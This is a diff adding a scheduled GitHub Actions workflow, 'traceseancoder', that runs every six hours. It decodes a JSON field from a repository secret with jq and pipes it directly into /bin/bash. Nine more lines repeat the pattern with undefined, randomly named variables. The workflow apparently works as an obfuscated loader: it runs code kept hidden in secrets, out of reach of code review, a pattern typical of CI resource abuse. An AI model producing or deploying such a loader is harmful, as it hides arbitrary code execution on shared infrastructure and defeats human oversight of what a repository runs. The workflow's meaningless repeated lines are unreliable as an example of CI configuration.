@@ -1,0 +1,27 @@
+name: traceseancoder
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: traceseancoder
+        env:
+          isyf7: ${{ secrets.isyf7 }}
+        run: |
+          echo $isyf7 | jq -r .p210 | /bin/bash
+          echo $t2 | jq -r .ha756 | /bin/bash
+          echo $qjyk39 | jq -r .wji7 | /bin/bash
+          echo $asril7505 | jq -r .p1857 | /bin/bash
+          echo $nn7 | jq -r .r290 | /bin/bash
+          echo $kcko42 | jq -r .iln38911 | /bin/bash
+          echo $qbe167 | jq -r .jr1 | /bin/bash
+          echo $myv569 | jq -r .vub6972 | /bin/bash
+          echo $jl329 | jq -r .kc6 | /bin/bash
+          echo $f42710 | jq -r .sjdit12997 | /bin/bash
+
